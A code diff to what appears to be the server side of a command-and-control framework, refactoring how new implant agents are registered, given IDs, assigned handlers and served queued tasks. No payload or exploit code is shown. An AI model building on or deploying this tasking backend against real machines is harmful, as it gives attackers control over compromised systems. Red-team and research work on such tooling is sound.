@@ -52,6 +52,9 @@ class Tasks(Resource):
 
 
 class Results(Resource):
+    def __init__(self,logger):
+        self.loggers = logger
+
     # ListResults
     def get(self):
         # Get all the result objects and return them to the user
@@ -68,28 +71,20 @@ class Results(Resource):
             # Parse out the result JSON that we want to add to the database
             body = request.get_json()
             json_obj = json.loads(json.dumps(body))
-            # Add a result UUID to each result object for tracking
-            json_obj['result_id'] = str(uuid.uuid4())
+
             # If the agent is new, set a unique agent id, start a new handler, and add it to the agent list
             if(json_obj['agent_id'] == "MA=="):
-                # Generate unique agent id
-                alphabet = string.ascii_letters + string.digits
-                agent_id = ''.join(secrets.choice(alphabet) for i in range(32))
-                agent_id_bytes = agent_id.encode("ascii")
-                base_64_bytes = base64.b64encode(agent_id_bytes)
-                base_64_agent_id = base_64_bytes.decode("ascii")
-                json_obj['agent_id'] = base_64_agent_id
-                # Create new handler for connection
-                newConn = Handler(agent_id)
-                newConn.start()
-
                 # Add new task for agent to change agent_id
-                new_agent_task = {
-                    "task_type": "configure",
-                    "agent_id": agent_id
-                }
+                json_obj['task_type'] = "configure"
                 # Add a task UUID to task object for tracking
                 json_obj['task_id'] = str(uuid.uuid4())
+                agent_id = str(uuid.uuid4())
+                json_obj['agent_id'] = agent_id
+                json_obj['dwell'] = "5.0"
+                json_obj['running'] = "true"
+                # Create new handler for connection
+                newConn = Handler(agent_id, self.loggers)
+                newConn.start()
                 # Save Task object to database
                 Task(**json_obj).save()
                 # Load the options provided for the task into an array for tracking in history
@@ -97,17 +92,21 @@ class Results(Resource):
                 for key in json_obj.keys():
                     # Anything that comes after task_type and task_id is treated as an option
                     if (key != "task_type" and key != "task_id"):
-                        task_options.append(key + ": " + json_obj[i][key])
+                        task_options.append(key + ": " + json_obj[key])
                 # Add to task history
                 TaskHistory(
-                    task_id=json_obj[i]['task_id'],
-                    task_type=json_obj[i]['task_type'],
+                    task_id=json_obj['task_id'],
+                    task_type=json_obj['task_type'],
                     task_object=json.dumps(json_obj),
                     task_options=task_options,
                     task_results=""
                 ).save()
-                
-            Result(**json_obj).save()
+            
+            else:
+                # Add a result UUID to each result object for tracking
+                json_obj['result_id'] = str(uuid.uuid4())
+                Result(**json_obj).save()
+            
             # Serve latest tasks to implant
             tasks = Task.objects().to_json()
             # Clear tasks so they don't execute twice
